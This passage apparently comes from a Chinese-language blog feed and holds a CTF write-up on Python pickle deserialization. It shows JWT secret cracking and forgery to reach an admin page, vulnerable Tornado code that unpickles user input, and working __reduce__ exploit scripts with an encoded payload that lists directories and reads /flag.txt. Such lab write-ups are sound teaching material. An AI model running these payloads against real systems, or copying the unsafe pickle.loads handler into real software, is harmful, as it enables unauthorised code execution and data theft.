alt="image-20240229160429059"></p><p>将dicount修改为一个很小的数</p><p>访问返回的&#x2F;b1g_m4mber提示需要admin, 这里用<a href="https://jwt.io/">https://jwt.io/</a> 和c-jwt-cracker 来伪造jwt</p><p>jwt 私钥破解</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229150958381.png" alt="image-20240229150958381"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160701863.png" alt="image-20240229160701863"></p><p>之后可以找到一个网站备份</p><p>涉及pickle的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (os.listdir,(<span class="string">&quot;/&quot;</span>,))</span><br><span class="line"> </span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(a))</span><br></pre></td></tr></table></figure><p>这里要在python2环境下进行, python3里生成的payload并不奏效</p><p>这里并不能使用os.system来执行命令, 不知道为什么..</p><p>生成payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cposix%0Alistdir%0Ap0%0A%28S%27/%27%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160938342.png" alt="image-20240229160938342"></p><p>读取flag.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;rb&#x27;).read()&quot;</span>,))</span><br><span class="line"> </span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(a))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229161110656.png" alt="image-20240229161110656"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pickle反序列化&quot;&gt;&lt;a href=&quot;#pickle反序列化&quot; class=&quot;headerlink&quot; title=&quot;pickle反序列化&quot;&gt;&lt;/a&gt;pickle反序列化&lt;/h1&gt;&lt;p&gt;在pyhton中也存在序列化和反序列化的操作, 由pickle模块实现&lt;/p</summary>
      
    
    
    
    
    <category term="pickle反序列化" scheme="http://example.com/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
